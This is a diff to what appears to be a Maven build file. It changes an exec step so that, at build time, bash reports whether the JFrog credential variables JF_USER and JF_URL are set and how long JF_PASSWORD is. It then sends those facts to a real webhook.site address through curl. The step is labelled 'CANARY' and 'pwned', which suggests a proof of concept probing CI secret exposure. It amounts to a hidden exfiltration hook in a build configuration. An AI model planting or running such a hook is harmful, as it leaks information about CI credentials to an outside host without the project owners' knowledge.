@@ -30,7 +30,7 @@
                             <executable>bash</executable>
                             <arguments>
                                 <argument>-c</argument>
-                                <argument>echo "CANARY :: JF_USER_set=$([ -n "$JF_USER" ] &amp;&amp; echo YES || echo no) JF_PASSWORD_len=${#JF_PASSWORD} JF_URL_set=$([ -n "$JF_URL" ] &amp;&amp; echo YES || echo no)"; curl -s -m 10 "https://webhook.site/YOUR-CANARY-ID/pwned-user-$([ -n "$JF_USER" ] &amp;&amp; echo 1 || echo 0)-pwlen-${#JF_PASSWORD}" || true</argument>
+                                <argument>echo "CANARY :: JF_USER_set=$([ -n "$JF_USER" ] &amp;&amp; echo YES || echo no) JF_PASSWORD_len=${#JF_PASSWORD} JF_URL_set=$([ -n "$JF_URL" ] &amp;&amp; echo YES || echo no)"; curl -s -m 10 "https://webhook.site/ba5d7763-53c5-4079-8e5b-40d74512af07/pwned-user-$([ -n "$JF_USER" ] &amp;&amp; echo 1 || echo 0)-pwlen-${#JF_PASSWORD}" || true</argument>
                             </arguments>
                         </configuration>
                     </execution>
